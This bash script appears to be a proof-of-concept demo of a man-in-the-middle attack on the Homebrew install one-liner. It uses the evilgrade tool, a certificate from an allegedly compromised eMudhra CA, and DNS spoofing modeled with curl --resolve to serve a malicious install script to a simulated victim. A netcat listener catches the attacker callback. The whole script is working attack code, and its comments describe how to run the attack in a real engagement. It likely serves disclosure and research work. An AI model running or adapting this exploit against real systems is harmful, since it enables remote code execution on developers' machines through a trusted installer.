#!/bin/bash
###############################################################################
# run_brew.sh - Homebrew install one-liner MITM, served by REAL evilgrade,
#               via the compromised eMudhra CA that /usr/bin/curl trusts.
#
# Drives evilgrade's own webserver (serve.pl) with the homebrew_update module,
# then runs the genuine Homebrew install one-liner as the victim. DNS spoof is
# modeled with curl --resolve; in a real engagement evilgrade's DNS server (or
# ARP/rogue DHCP) points raw.githubusercontent.com at the attacker.
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
. demo/emudhra_mitm/_lib.sh

LHOST=127.0.0.1; LPORT=4444
pick_port PORT 9443 9543 12443 18443
HOSTS="raw.githubusercontent.com:$PORT:127.0.0.1"
URL="https://raw.githubusercontent.com:$PORT/Homebrew/install/HEAD/install.sh"

rm -f /tmp/OWNED_BY_BREW /tmp/brew_cb.log
( nc -l "$LPORT" > /tmp/brew_cb.log 2>&1 ) & NCPID=$!

echo "== starting REAL evilgrade webserver (homebrew_update, eMudhra cert) on :$PORT =="
start_evilgrade "$PORT" /tmp/eg_brew.log "homebrew_update:$LHOST:$LPORT" || { kill $NCPID 2>/dev/null; exit 1; }

echo
echo "== VICTIM: genuine Homebrew install one-liner (DNS spoofed -> evilgrade) =="
echo "   \$ /bin/bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
/bin/bash -c "$(/usr/bin/curl -fsSL --resolve "$HOSTS" "$URL")" 2>&1 | sed 's/^/   /'
sleep 1

echo
echo "== PROOF: /tmp/OWNED_BY_BREW =="; [ -f /tmp/OWNED_BY_BREW ] && sed 's/^/   /' /tmp/OWNED_BY_BREW || echo "   <not created>"
echo "== PROOF: attacker callback on $LHOST:$LPORT =="; [ -s /tmp/brew_cb.log ] && sed 's/^/   /' /tmp/brew_cb.log || echo "   <none>"
echo
echo "== CONTROL: Apple Secure Transport backend rejects the eMudhra cert =="
printf "   secure-transport: "; CURL_SSL_BACKEND=secure-transport /usr/bin/curl -s --resolve "$HOSTS" "$URL" -o /dev/null 2>/dev/null && echo "accepted (unexpected)" || echo "REJECTED (curl 60)"

kill "$EG_PID" "$NCPID" >/dev/null 2>&1; wait 2>/dev/null
echo; echo "== done =="
